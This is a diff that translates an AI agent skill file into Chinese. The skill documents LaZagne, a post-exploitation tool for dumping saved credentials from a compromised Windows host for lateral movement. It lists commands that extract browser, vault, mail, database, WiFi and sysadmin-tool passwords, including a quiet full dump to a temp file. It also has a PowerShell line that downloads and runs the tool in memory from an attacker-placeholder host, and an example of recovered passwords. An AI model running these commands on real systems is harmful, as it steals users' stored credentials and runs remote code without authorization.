@@ -1,91 +1,84 @@
 ---
 name: lazagne
 description: >
-  This skill should be used when the user asks about "lazagne", "dump saved
-  credentials from a compromised host", "extract browser passwords, recover
-  application credentials", "collect all local credentials for lateral
-  movement". Post-exploitation credential recovery tool that extracts saved
-  passwords from browsers, mail clients, databases, Git, WiFi, and other
-  installed applications.
+  此技能适用于用户询问关于"lazagne"、"从被攻陷主机中转储已保存凭证"、"提取浏览器密码，恢复应用程序凭证"、"收集所有本地凭证用于横向移动"。后渗透凭证恢复工具，从浏览器、邮件客户端、数据库、Git、WiFi 及其他已安装应用中提取已保存密码。
 ---
 
 # LaZagne
 
-Post-exploitation credential recovery from installed applications — browsers, mail, Git, databases, WiFi, and more.
+从已安装应用中进行后渗透凭证恢复 — 浏览器、邮件、Git、数据库、WiFi 等。
 
-## Quick Start
+## 快速开始
 
 ```cmd
-# Dump everything
+# 转储所有凭证
 lazagne.exe all
 
-# Browsers only
+# 仅浏览器
 lazagne.exe browsers
 
-# Specific module
+# 特定模块
 lazagne.exe windows
 ```
 
-## Module Categories
+## 模块分类
 
-| Category | What's Covered |
-|----------|----------------|
-| `browsers` | Chrome, Firefox, Edge, Opera, IE, Brave |
-| `windows` | Credential Manager, DPAPI, LSA secrets, Vault |
-| `mails` | Thunderbird, Outlook, Outlook Express |
-| `databases` | MySQL, PostgreSQL, MSSQL, Oracle |
-| `network` | WiFi passwords, VPN (Cisco, OpenVPN, WireGuard) |
-| `memory` | KeePass, mRemoteNG, Pidgin |
-| `git` | Git credentials |
+| 分类 | 覆盖范围 |
+|------|----------|
+| `browsers` | Chrome、Firefox、Edge、Opera、IE、Brave |
+| `windows` | 凭证管理器、DPAPI、LSA secrets、Vault |
+| `mails` | Thunderbird、Outlook、Outlook Express |
+| `databases` | MySQL、PostgreSQL、MSSQL、Oracle |
+| `network` | WiFi 密码、VPN（Cisco、OpenVPN、WireGuard） |
+| `memory` | KeePass、mRemoteNG、Pidgin |
+| `git` | Git 凭证 |
 | `chats` | Skype |
-| `sysadmin` | WinSCP, PuTTY, FileZilla, mRemoteNG, TeamViewer |
+| `sysadmin` | WinSCP、PuTTY、FileZilla、mRemoteNG、TeamViewer |
 
-## Core Flags
+## 核心参数
 
-| Flag | Description |
-|------|-------------|
-| `all` | Run all modules |
-| `<module>` | Run specific module category |
-| `-oJ <file>` | JSON output |
-| `-oN <file>` | Text output |
-| `-oA <dir>` | All output formats to directory |
-| `-v` | Verbose |
-| `-vv` | Debug |
-| `-quiet` | No banner |
+| 参数 | 说明 |
+|------|------|
+| `all` | 运行所有模块 |
+| `<module>` | 运行指定模块分类 |
+| `-oJ <file>` | JSON 输出 |
+| `-oN <file>` | 文本输出 |
+| `-oA <dir>` | 所有输出格式保存到目录 |
+| `-v` | 详细输出 |
+| `-vv` | 调试输出 |
+| `-quiet` | 无横幅 |
 
-## Common Workflows
+## 常用工作流
 
 ```cmd
-# Full credential dump to JSON
+# 全量凭证转储到 JSON
 lazagne.exe all -oJ C:\Windows\Temp\creds.json -quiet
 
-# Browser creds only
+# 仅浏览器凭证
 lazagne.exe browsers -v
 
-# Sysadmin tool creds (WinSCP, FileZilla, etc.)
+# 系统管理员工具凭证（WinSCP、FileZilla 等）
 lazagne.exe sysadmin
 
-# WiFi passwords
+# WiFi 密码
 lazagne.exe network
 
-# Run from PowerShell (in-memory if needed)
-# Download and run without dropping to disk:
+# 从 PowerShell 运行（如需在内存中执行）
+# 下载并运行而不落盘：
 IEX(New-Object Net.WebClient).DownloadString('http://attacker/LaZagne.py')
 ```
 
-## Output Example
+## 输出示例
 
 ```
 [+] Password found !!!
 URL: https://corp-mail.example.com
-Login: john.doe@example.com  
+Login: john.doe@example.com
 Password: Summer2024!
 ```
 
-## Resources
+## 参考资源
 
-| File | When to load |
-|------|--------------|
-| `references/credential-sources.md` | Module details, DPAPI decryption, browser DB paths, output parsing |
-
-## Structuring This Skill
+| 文件 | 加载时机 |
+|------|----------|
+| `references/credential-sources.md` | 模块详情、DPAPI 解密、浏览器 DB 路径、输出解析 |
